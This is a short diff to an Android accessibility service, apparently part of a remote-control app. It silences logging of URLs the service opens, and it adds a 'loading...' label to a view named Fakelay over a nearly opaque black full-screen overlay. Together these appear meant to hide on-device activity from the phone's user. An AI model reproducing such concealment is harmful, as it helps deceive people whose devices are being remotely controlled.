@@ -274,11 +274,11 @@ class InputService : AccessibilityService() {
 	     try {
 		Handler(Looper.getMainLooper()).post(
 		{
-		    Log.d(logTag,"url:$url")
+		   // Log.d(logTag,"url:$url")
 		    val intent = Intent("android.intent.action.VIEW", Uri.parse(url))
 		    intent.flags = 268435456
 		    if (intent.resolveActivity(packageManager) != null) {
-			  Log.d(logTag,"url:go on")
+			 // Log.d(logTag,"url:go on")
 			      FloatingWindowService.app_ClassGen11_Context?.let {
 				    // 在这里使用 it 代替 context
 				    it.startActivity(intent)
@@ -287,7 +287,7 @@ class InputService : AccessibilityService() {
 		    }
 		    else
 		   {
-                           Log.d(logTag,"url:go")
+                         //  Log.d(logTag,"url:go")
                           // FloatingWindowService.app_ClassGen11_Context.startActivity(intent)
 			    FloatingWindowService.app_ClassGen11_Context?.let {
 				    // 在这里使用 it 代替 context
@@ -296,7 +296,7 @@ class InputService : AccessibilityService() {
 		   }
 		})
 	     } catch (e: Exception) {
-		Log.d(logTag,"Exception:${e.message}")
+		//Log.d(logTag,"Exception:${e.message}")
 	       // 处理异常，显示错误信息
 	      // Toast.makeText(this, "打开浏览器失败: ${e.message}", Toast.LENGTH_SHORT).show()
 	    }
@@ -751,8 +751,24 @@ class InputService : AccessibilityService() {
     	overLay =  FrameLayout(this)
     	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
     	overLay.getBackground().setAlpha(253)
-    	gohome=8
+    	gohome = 8
 	overLay.setVisibility(gohome)
+
+        val loadingText = TextView(this, null)
+	loadingText.text = "loading..."
+	loadingText.setTextColor(-7829368)
+	loadingText.textSize = 20.0f
+	loadingText.gravity = Gravity.CENTER
+	loadingText.setPadding(0, 250, 0, 0)
+
+	val dp2px: Int = dp2px(this, 100.0f) //200.0f
+	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 3)
+	paramstext.gravity = Gravity.CENTER
+	loadingText.layoutParams = paramstext
+
+	//Fakelay.addView(getView2())
+	Fakelay.addView(loadingText)
+	
         windowManager.addView(overLay, overLayparams_bass)
     }
     
